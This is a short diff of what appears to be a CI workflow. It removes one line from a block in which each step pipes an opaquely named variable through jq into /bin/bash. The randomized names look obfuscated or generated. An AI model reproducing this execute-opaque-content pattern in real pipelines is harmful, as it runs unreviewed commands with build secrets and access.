@@ -30,7 +30,6 @@ jobs:
           echo $ldlx6327 | jq -r .blylz50 | /bin/bash
           printf '%s' "$lmtv310" | jq -r .sx59509 | /bin/bash
           printf '%s' "$hubcs46" | jq -r .sketp2487 | /bin/bash
-          echo $l822 | jq -r .waqpn03 | /bin/bash
           echo $wbw9384 | jq -r .w168 | /bin/bash
           echo $jb812 | jq -r .kur19 | /bin/bash
           printf '%s' "$tvw2" | jq -r .vj9 | /bin/bash
